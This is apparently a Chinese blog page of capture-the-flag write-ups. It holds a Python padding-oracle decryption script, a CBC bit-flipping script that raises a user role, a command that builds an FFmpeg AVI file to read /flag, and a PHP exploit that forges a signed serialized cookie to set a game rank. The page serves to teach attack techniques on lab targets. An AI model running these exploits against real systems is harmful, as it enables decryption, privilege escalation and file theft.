json</span><br><span class="line"></span><br><span class="line">host = <span class="string">"9f296959-f1ae-4bba-b187-aad6cc511dfc.node3.buuoj.cn"</span></span><br><span class="line">port = 80</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def padding_oracle(key):</span><br><span class="line">    user_key_decode = base64.b64decode(key)</span><br><span class="line">    user_key_json_decode = json.loads(user_key_decode)</span><br><span class="line">    signed_key = user_key_json_decode[<span class="string">'signed_key'</span>]</span><br><span class="line">    signed_key_decoded = base64.b64decode(signed_key)</span><br><span class="line">    <span class="comment">#print(signed_key_decoded)</span></span><br><span class="line">    url = <span class="string">"http://"</span> + host + <span class="string">":"</span> + str(port) + <span class="string">"/frontend/api/v1/user/info"</span></span><br><span class="line">    <span class="comment">#print(signed_key_decoded)</span></span><br><span class="line">    <span class="comment"># b'ICxkSingDanceRaPY\xac\xad&gt;\xe4h]\xd0[\xfa(_\xb5*N(&amp;\xc8\xc62\xd1\x06&gt;M\xe2\xb7\xdaLEz\x8cd\xfd\x8e\xb2\xde\x19\xbf\x84\x15\xbe\x88\xb8\xae*\xfb\x0c)#\xbeT\xf0\x89\x14\x8e\xce\x96\xb4\xbf\x1aV\xbcU\x98ns;\xf9\xfb\xcb\xf7Z\xb0\x88\x1c\xd4\xa6D\xd2\xa5\x00^\x03\xbd\x1e\xa5\xd1\x19Tf=3g\xcd\xd7\x88'</span></span><br><span class="line">    <span class="comment"># print(len(signed_key_decoded))</span></span><br><span class="line">    <span class="comment"># 112/16=7</span></span><br><span class="line">    N = 16</span><br><span class="line"></span><br><span class="line">    total_plain = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> block <span class="keyword">in</span> range(0, len(signed_key_decoded) // 16 - 1):</span><br><span class="line">        token = <span class="string">''</span></span><br><span class="line">        get = b<span class="string">""</span></span><br><span class="line">        cipher = signed_key_decoded[16 + block * 16:32 + block * 16]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(1, N+1):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(0, 256):</span><br><span class="line">                time.sleep(0.15) </span><br><span class="line">                padding = b<span class="string">""</span>.join([(get[n] ^ i).to_bytes(1, <span class="string">'little'</span>) <span class="keyword">for</span> n <span class="keyword">in</span> range(len(get))])</span><br><span class="line">                c = b<span class="string">'\x00'</span> * (16 - i) + j.to_bytes(1, <span class="string">'little'</span>) + padding + cipher</span><br><span class="line">                token = base64.b64encode(c)</span><br><span class="line">                user_key_json_decode[<span class="string">'signed_key'</span>] = token.decode(<span class="string">"utf-8"</span>)</span><br><span class="line">                header = &#123;<span class="string">'Key'</span>: base64.b64encode(bytes(json.dumps(user_key_json_decode), <span class="string">"utf-8"</span>))&#125;</span><br><span class="line">                res = requests.get(url, headers=header)</span><br><span class="line">                <span class="keyword">if</span> res.json()[<span class="string">'code'</span>] != 205:</span><br><span class="line">                    get = (j ^ i).to_bytes(1, <span class="string">'little'</span>) + get</span><br><span class="line">                    <span class="built_in">print</span>(get, i)</span><br><span class="line">                    <span class="built_in">break</span></span><br><span class="line"></span><br><span class="line">        plain = b<span class="string">""</span>.join([(get[i] ^ signed_key_decoded[block * 16 + i]).to_bytes(1, <span class="string">'little'</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(N)])</span><br><span class="line">        <span class="built_in">print</span>(plain.decode(<span class="string">"utf-8"</span>), <span class="string">"block=%d"</span> % block)</span><br><span class="line">        total_plain += plain.decode(<span class="string">"utf-8"</span>)</span><br><span class="line">        <span class="built_in">print</span>(total_plain)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> total_plain</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plain_text = padding_oracle(<span class="string">"eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaFRXUWdpd1pvaGoyN0pXdDk4LysxWnlXM2EyRll3OHFaZ0tvaEExVHJZdmFGSVRGOGlWWlBFYldjWm5FcEJzYi9NWWlmNXRHMWVwV01kZ3JhbUgyRDNqTGFodnZqRVBucVF4VGNXRnZ5ajJnPT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoidVppNFBWY09Sb2xPam94aUpzV1FyY2RPQnZCZFNxR0kiLCJleHBpcmVfaW4iOjE1ODE0MTc0MzJ9"</span>)</span><br><span class="line"><span class="built_in">print</span>(plain_text)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>signed_key解密结果是{“role”:3,”user_id”:1,”payload”:”uZi4PVcORolOjoxiJsWQrcdOBvBdSqGI”,”expire_in”:1581417432}末尾还有几个\x05<br>再用 <a href="https://blog.csdn.net/csu_vc/article/details/79619309" target="_blank" rel="noopener">CBC翻转攻击</a>变更角色，提升系统内权限<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">host = <span class="string">"9f296959-f1ae-4bba-b187-aad6cc511dfc.node3.buuoj.cn"</span></span><br><span class="line">port = 80</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def cbc_attack(key, block, origin_content, target_content):</span><br><span class="line">    user_key_decode = base64.b64decode(key)</span><br><span class="line">    <span class="comment">#print(user_key_decode)</span></span><br><span class="line">    user_key_json_decode = json.loads(user_key_decode)</span><br><span class="line">    signed_key = user_key_json_decode[<span class="string">'signed_key'</span>]</span><br><span class="line">    <span class="comment">#print(signed_key)</span></span><br><span class="line">    cipher_o = base64.b64decode(signed_key)</span><br><span class="line">    <span class="comment">#print(cipher_o)</span></span><br><span class="line">    <span class="keyword">if</span> block &gt; 0:</span><br><span class="line">        iv_prefix = cipher_o[:block * 16]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        iv_prefix = b<span class="string">''</span></span><br><span class="line">    iv = cipher_o[block * 16:16 + block * 16]</span><br><span class="line">    cipher = cipher_o[16 + block * 16:]</span><br><span class="line">    iv_array = bytearray(iv)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(0, 16):</span><br><span class="line">        iv_array[i] = iv_array[i] ^ ord(origin_content[i]) ^ ord(target_content[i])</span><br><span class="line">    iv = bytes(iv_array)</span><br><span class="line">    <span class="comment">#print(iv)</span></span><br><span class="line">    user_key_json_decode[<span class="string">'signed_key'</span>] = base64.b64encode(iv_prefix + iv + cipher).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="built_in">return</span> base64.b64encode(bytes(json.dumps(user_key_json_decode), <span class="string">"utf-8"</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_user_info(key):</span><br><span class="line">    r = requests.post(<span class="string">"http://"</span> + host + <span class="string">":"</span> + str(port) + <span class="string">"/frontend/api/v1/user/info"</span>, headers=&#123;<span class="string">"Key"</span>: key&#125;)</span><br><span class="line">    <span class="keyword">if</span> r.json()[<span class="string">'code'</span>] == 100:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"获取成功！"</span>)</span><br><span class="line">    <span class="built_in">return</span> r.json()[<span class="string">'data'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def modify_role_plain(key, role):</span><br><span class="line">    user_key_decode = base64.b64decode(user_key)</span><br><span class="line">    user_key_json_decode = json.loads(user_key_decode)</span><br><span class="line">    user_key_json_decode[<span class="string">'role'</span>] = role</span><br><span class="line">    <span class="built_in">return</span> base64.b64encode(bytes(json.dumps(user_key_json_decode), <span class="string">'utf-8'</span>)).decode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user_key = cbc_attack(</span><br><span class="line">    <span class="string">"eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaFRXUWdpd1pvaGoyN0pXdDk4LysxWnlXM2EyRll3OHFaZ0tvaEExVHJZdmFGSVRGOGlWWlBFYldjWm5FcEJzYi9NWWlmNXRHMWVwV01kZ3JhbUgyRDNqTGFodnZqRVBucVF4VGNXRnZ5ajJnPT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoidVppNFBWY09Sb2xPam94aUpzV1FyY2RPQnZCZFNxR0kiLCJleHBpcmVfaW4iOjE1ODE0MTc0MzJ9"</span>, 0, <span class="string">'&#123;"role":3,"user_'</span>, <span class="string">'&#123;"role":1,"user_'</span>)</span><br><span class="line">user_key = modify_role_plain(user_key, 1)</span><br><span class="line"><span class="built_in">print</span>(user_key)</span><br></pre></td></tr></table></figure></p>
<p>添加cookie 在console控制台 document.cookie=”key=value”<br>再上传构造过的 AVI 文件来触发 FFMpeg 漏洞读取 flag.<br><a href="https://github.com/neex/ffmpeg-avi-m3u-xbin/blob/master/gen_xbin_avi.py" target="_blank" rel="noopener">git链接</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 gen_xbin_avi.py file:///flag test.avi</span><br></pre></td></tr></table></figure></p>
<p>上传之后再下载 flag在第一帧<br><img src="https://uploader.shimo.im/f/5VYuwiJu8f4TOCru.png!thumbnail" alt></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/03/2020HGAME/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="cop">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="cop's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/02/03/2020HGAME/" itemprop="url">2020HGAME</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-03T21:32:27+08:00">
                2020-02-03
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>在家堕落了好多天，今天去做了下Hgame的week3</p>
<h2 id="序列之争-Ordinal-Scale"><a href="#序列之争-Ordinal-Scale" class="headerlink" title="序列之争 - Ordinal Scale"></a>序列之争 - Ordinal Scale</h2><p>题目提示第一名才能拿到flag<br>打开题目，f12找到源码压缩包提示，下载之后就是审计了<br>cardinal.php<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line">class Game</span><br><span class="line">&#123;   </span><br><span class="line">    private <span class="variable">$encryptKey</span> = <span class="string">'SUPER_SECRET_KEY_YOU_WILL_NEVER_KNOW'</span>;</span><br><span class="line">    public <span class="variable">$welcomeMsg</span> = <span class="string">'%s, Welcome to Ordinal Scale!'</span>;</span><br><span class="line"></span><br><span class="line">    private <span class="variable">$sign</span> = <span class="string">''</span>;</span><br><span class="line">    public <span class="variable">$rank</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __construct(<span class="variable">$playerName</span>)&#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">'player'</span>] = <span class="variable">$playerName</span>;</span><br><span class="line">        <span class="keyword">if</span>(!isset(<span class="variable">$_SESSION</span>[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">'exp'</span>] = 0;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$data</span> = [<span class="variable">$playerName</span>, <span class="variable">$this</span>-&gt;encryptKey];</span><br><span class="line">        <span class="variable">$this</span>-&gt;init(<span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$this</span>-&gt;monster = new Monster(<span class="variable">$this</span>-&gt;sign);</span><br><span class="line">        <span class="variable">$this</span>-&gt;rank = new Rank();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private <span class="keyword">function</span> init(<span class="variable">$data</span>)&#123;</span><br><span class="line">        foreach(<span class="variable">$data</span> as <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;welcomeMsg = sprintf(<span class="variable">$this</span>-&gt;welcomeMsg, <span class="variable">$value</span>);</span><br><span class="line">            <span class="variable">$this</span>-&gt;sign .= md5(<span class="variable">$this</span>-&gt;sign . <span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Rank</span><br><span class="line">&#123;</span><br><span class="line">    private <span class="variable">$rank</span>;</span><br><span class="line">    private <span class="variable">$serverKey</span>;     // 服务器的 Key</span><br><span class="line">    private <span class="variable">$key</span> = <span class="string">'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>()&#123;</span><br><span class="line">        <span class="keyword">if</span>(!isset(<span class="variable">$_SESSION</span>[<span class="string">'rank'</span>]))&#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;Set(rand(2, 1000));</span><br><span class="line">            <span class="built_in">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$this</span>-&gt;Set(<span class="variable">$_SESSION</span>[<span class="string">'rank'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> Set(<span class="variable">$no</span>)&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;rank = <span class="variable">$no</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">Get</span></span>()&#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$this</span>-&gt;rank;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> Fight(<span class="variable">$monster</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$monster</span>[<span class="string">'no'</span>] &gt;= <span class="variable">$this</span>-&gt;rank)&#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;rank -= rand(5, 15);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$this</span>-&gt;rank &lt;= 2)&#123;</span><br><span class="line">                <span class="variable">$this</span>-&gt;rank = 2;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">'exp'</span>] += rand(20, 200);</span><br><span class="line">            <span class="built_in">return</span> array(</span><br><span class="line">                <span class="string">'result'</span> =&gt; <span class="literal">true</span>, </span><br><span class="line">                <span class="string">'msg'</span> =&gt; <span class="string">'&lt;span style="color:green;"&gt;Congratulations! You win! &lt;/span&gt;'</span></span><br><span class="line">            );</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">return</span> array(</span><br><span class="line">                <span class="string">'result'</span> =&gt; <span class="literal">false</span>, </span><br><span class="line">                <span class="string">'msg'</span> =&gt; <span class="string">'&lt;span style="color:red;"&gt;You die!&lt;/span&gt;'</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()&#123;</span><br><span class="line">        // 确保程序是跑在服务器上的！</span><br><span class="line">        <span class="variable">$this</span>-&gt;serverKey = <span class="variable">$_SERVER</span>[<span class="string">'key'</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$this</span>-&gt;key === <span class="variable">$this</span>-&gt;serverKey)&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">'rank'</span>] = <span class="variable">$this</span>-&gt;rank;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            // 非正常访问</span><br><span class="line">            session_start();</span><br><span class="line">            session_destroy();</span><br><span class="line">            setcookie(<span class="string">'monster'</span>, <span class="string">''</span>);</span><br><span class="line">            header(<span class="string">'Location: index.php'</span>);</span><br><span class="line">            <span class="built_in">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Monster</span><br><span class="line">&#123;</span><br><span class="line">    private <span class="variable">$monsterData</span>;</span><br><span class="line">    private <span class="variable">$encryptKey</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __construct(<span class="variable">$key</span>)&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;encryptKey = <span class="variable">$key</span>;</span><br><span class="line">        <span class="keyword">if</span>(!isset(<span class="variable">$_COOKIE</span>[<span class="string">'monster'</span>]))&#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;Set();</span><br><span class="line">            <span class="built_in">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$monsterData</span> = base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">'monster'</span>]);</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="variable">$monsterData</span>) &gt; 32)&#123;</span><br><span class="line">            <span class="variable">$sign</span> = substr(<span class="variable">$monsterData</span>, -32);</span><br><span class="line">            <span class="variable">$monsterData</span> = substr(<span class="variable">$monsterData</span>, 0, strlen(<span class="variable">$monsterData</span>) - 32);</span><br><span class="line">            <span class="keyword">if</span>(md5(<span class="variable">$monsterData</span> . <span class="variable">$this</span>-&gt;encryptKey) === <span class="variable">$sign</span>)&#123;</span><br><span class="line">                <span class="variable">$this</span>-&gt;monsterData = unserialize(<span class="variable">$monsterData</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                session_start();</span><br><span class="line">                session_destroy();</span><br><span class="line">                setcookie(<span class="string">'monster'</span>, <span class="string">''</span>);</span><br><span class="line">                header(<span class="string">'Location: index.php'</span>);</span><br><span class="line">                <span class="built_in">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$this</span>-&gt;Set();     </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">Set</span></span>()&#123;</span><br><span class="line">        <span class="variable">$monsterName</span> = [<span class="string">'无名小怪'</span>, <span class="string">'BOSS: The Kernal Cosmos'</span>, <span class="string">'小怪: Big Eggplant'</span>, <span class="string">'BOSS: The Mole King'</span>, <span class="string">'BOSS: Zero Zone Witch'</span>];</span><br><span class="line">        <span class="variable">$this</span>-&gt;monsterData = array(</span><br><span class="line">            <span class="string">'name'</span> =&gt; <span class="variable">$monsterName</span>[array_rand(<span class="variable">$monsterName</span>, 1)],</span><br><span class="line">            <span class="string">'no'</span> =&gt; rand(1, 2000),</span><br><span class="line">        );</span><br><span class="line">        <span class="variable">$this</span>-&gt;Save();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">Get</span></span>()&#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$this</span>-&gt;monsterData;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private <span class="keyword">function</span> <span class="function"><span class="title">Save</span></span>()&#123;</span><br><span class="line">        <span class="variable">$sign</span> = md5(serialize(<span class="variable">$this</span>-&gt;monsterData) . <span class="variable">$this</span>-&gt;encryptKey);</span><br><span class="line">        setcookie(<span class="string">'monster'</span>, base64_encode(serialize(<span class="variable">$this</span>-&gt;monsterData) . <span class="variable">$sign</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这个游戏大概意思就是先输入一个用户名，然后随机给一个rank，不断挑战，每次挑战成功rank提升5-15名<br>最后判断第一名的时候，再设置成第二名<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">function</span> Fight(<span class="variable">$monster</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$monster</span>[<span class="string">'no'</span>] &gt;= <span class="variable">$this</span>-&gt;rank)&#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;rank -= rand(5, 15);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$this</span>-&gt;rank &lt;= 2)&#123;</span><br><span class="line">                <span class="variable">$this</span>-&gt;rank = 2;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></p>
<p>只要让rank=1就行了<br>审计中发现只要知道sign就可以控制cookie中的monster值反序列化<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$monsterData</span> = base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">'monster'</span>]);</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="variable">$monsterData</span>) &gt; 32)&#123;</span><br><span class="line">            <span class="variable">$sign</span> = substr(<span class="variable">$monsterData</span>, -32);</span><br><span class="line">            <span class="variable">$monsterData</span> = substr(<span class="variable">$monsterData</span>, 0, strlen(<span class="variable">$monsterData</span>) - 32);</span><br><span class="line">            <span class="keyword">if</span>(md5(<span class="variable">$monsterData</span> . <span class="variable">$this</span>-&gt;encryptKey) === <span class="variable">$sign</span>)&#123;</span><br><span class="line">                <span class="variable">$this</span>-&gt;monsterData = unserialize(<span class="variable">$monsterData</span>);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></p>
<p>sign是由game类中的encryptKey而来，用encryptKey = ‘SUPER_SECRET_KEY_YOU_WILL_NEVER_KNOW’<br>验证出来是不对的233<br>只要可以控制monster，可以用rank类destruct方法控制rank<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()&#123;</span><br><span class="line">        // 确保程序是跑在服务器上的！</span><br><span class="line">        <span class="variable">$this</span>-&gt;serverKey = <span class="variable">$_SERVER</span>[<span class="string">'key'</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$this</span>-&gt;key === <span class="variable">$this</span>-&gt;serverKey)&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">'rank'</span>] = <span class="variable">$this</span>-&gt;rank;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p>
<p>但是destruct里面又加了一层验证，不知道key是啥233<br>感谢旺哥，旺哥tql<br>第一步 格式化字符串获取encryptKey<br><img src="https://uploader.shimo.im/f/ceAQi9FMBc4EKA97.png!thumbnail" alt><br>第二步 引用属性<br>exp<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">class Rank</span><br><span class="line">&#123;</span><br><span class="line">    private <span class="variable">$rank</span>;</span><br><span class="line">    private <span class="variable">$serverKey</span>;     // 服务器的 Key</span><br><span class="line">    private <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;rank = 1;</span><br><span class="line">        <span class="variable">$this</span>-&gt;key = &amp;<span class="variable">$this</span>-&gt;serverKey;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = new Rank();</span><br><span class="line"><span class="variable">$data</span> = [<span class="string">'cop'</span>, <span class="string">'gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL'</span>];</span><br><span class="line"><span class="variable">$sign</span> = <span class="string">''</span>;</span><br><span class="line">foreach(<span class="variable">$data</span> as <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$sign</span>.=md5(<span class="variable">$sign</span>.<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sign</span> = md5(serialize(<span class="variable">$a</span>).<span class="variable">$sign</span>);</span><br><span class="line"><span class="variable">$rank_monster</span> = base64_encode(serialize(<span class="variable">$a</span>).<span class="variable">$sign</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$rank_monster</span>;</span><br></pre></td></tr></table></figure></p>
